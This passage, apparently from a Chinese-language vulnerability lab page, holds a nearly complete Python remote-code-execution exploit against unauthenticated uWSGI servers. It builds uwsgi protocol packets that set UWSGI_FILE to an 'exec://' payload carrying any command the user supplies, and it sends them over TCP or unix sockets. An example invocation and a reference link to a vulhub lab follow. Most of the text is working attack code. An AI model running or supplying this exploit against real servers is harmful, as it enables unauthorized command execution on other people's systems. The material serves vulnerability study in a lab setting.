1)[1]<br />    host, _, url = url.partition('/')<br />    return (host, '/' + url)<br /><br /><br />def fetch_data(uri, payload=None, body=None):<br />    if 'http' not in uri:<br />        uri = 'http://' + uri<br />    s = requests.Session()<br />    # s.headers['UWSGI_FILE'] = payload<br />    if body:<br />        import urlparse<br />        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))<br />        d = s.post(uri, data=body_d)<br />    else:<br />        d = s.get(uri)<br /><br />    return {<br />        'code': d.status_code,<br />        'text': d.text,<br />        'header': d.headers<br />    }<br /><br /><br />def ask_uwsgi(addr_and_port, mode, var, body=''):<br />    if mode == 'tcp':<br />        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />        s.connect(parse_addr(addr_and_port))<br />    elif mode == 'unix':<br />        s = socket.socket(socket.AF_UNIX)<br />        s.connect(addr_and_port)<br />    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))<br />    response = []<br />    # Actually we dont need the response, it will block if we run any commands.<br />    # So I comment all the receiving stuff. <br />    # while 1:<br />    #     data = s.recv(4096)<br />    #     if not data:<br />    #         break<br />    #     response.append(data)<br />    s.close()<br />    return b''.join(response).decode('utf8')<br /><br /><br />def curl(mode, addr_and_port, payload, target_url):<br />    host, uri = get_host_from_url(target_url)<br />    path, _, qs = uri.partition('?')<br />    if mode == 'http':<br />        return fetch_data(addr_and_port+uri, payload)<br />    elif mode == 'tcp':<br />        host = host or parse_addr(addr_and_port)[0]<br />    else:<br />        host = addr_and_port<br />    var = {<br />        'SERVER_PROTOCOL': 'HTTP/1.1',<br />        'REQUEST_METHOD': 'GET',<br />        'PATH_INFO': path,<br />        'REQUEST_URI': uri,<br />        'QUERY_STRING': qs,<br />        'SERVER_NAME': host,<br />        'HTTP_HOST': host,<br />        'UWSGI_FILE': payload,<br />        'SCRIPT_NAME': target_url<br />    }<br />    return ask_uwsgi(addr_and_port, mode, var)<br /><br /><br />def main(*args):<br />    desc = """<br />    This is a uwsgi client &amp; RCE exploit.<br />    Last modifid at 2018-01-30 by wofeiwo@80sec.com<br />    """<br />    elog = "Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111&gt;/tmp/abc\""<br />    <br />    parser = argparse.ArgumentParser(description=desc, epilog=elog)<br /><br />    parser.add_argument('-m', '--mode', nargs='?', default='tcp',<br />                        help='Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.',<br />                        dest='mode', choices=['http', 'tcp', 'unix'])<br /><br />    parser.add_argument('-u', '--uwsgi', nargs='?', required=True,<br />                        help='Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock',<br />                        dest='uwsgi_addr')<br /><br />    parser.add_argument('-c', '--command', nargs='?', required=True,<br />                        help='Command: The exploit command you want to execute, must have this.',<br />                        dest='command')<br /><br />    if len(sys.argv) &lt; 2:<br />        parser.print_help()<br />        return<br />    args = parser.parse_args()<br />    if args.mode.lower() == "http":<br />        print("[-]Currently only tcp/unix method is supported in RCE exploit.")<br />        return<br />    payload = 'exec://' + args.command + &quot;; echo test&quot; # must have someting in output or the uWSGI crashs.<br />    print("[*]Sending payload.")<br />    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))<br /><br />if __name__ == '__main__':<br />    main()</p><h2>参考链接</h2><p>https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/README.zh-cn.md</p></body></html>